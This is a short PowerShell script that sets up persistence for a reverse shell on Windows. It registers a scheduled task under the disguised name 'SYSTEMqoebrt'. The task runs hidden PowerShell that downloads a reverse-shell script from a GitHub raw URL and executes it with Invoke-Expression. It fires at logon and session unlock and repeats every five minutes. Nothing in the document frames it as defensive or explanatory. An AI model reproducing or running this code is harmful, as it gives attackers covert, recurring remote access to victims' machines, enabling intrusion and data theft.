# Define the task action to run the PowerShell script from the URI
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command 'Invoke-RestMethod -Uri ''https://raw.githubusercontent.com/RacoonK1ng/Reverse-Powershell/refs/heads/main/reverse-shell.ps1'' | Invoke-Expression'"

# Define the task trigger to run when the session is unlocked
$trigger = New-ScheduledTaskTrigger -AtLogon
$trigger.StateChange = 'SessionUnlock' # Set trigger to session unlock event

# Define the repetition interval for the trigger (every 5 minutes)
$trigger.RepetitionInterval = [System.TimeSpan]::FromMinutes(5)
$trigger.StopAtDurationEnd = $false

# Define task settings (similar to those in the XML)
$settings = New-ScheduledTaskSettingsSet -AllowStartOnDemand $true -StartWhenAvailable $false -RunOnlyIfNetworkAvailable $false -WakeToRun $false -ExecutionTimeLimit (New-TimeSpan -Hours 72)

# Create the scheduled task object
$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings

# Register the scheduled task without specifying a principal (it will use the elevated privileges of the user running the script)
Register-ScheduledTask -TaskName "SYSTEMqoebrt" -InputObject $task

exit
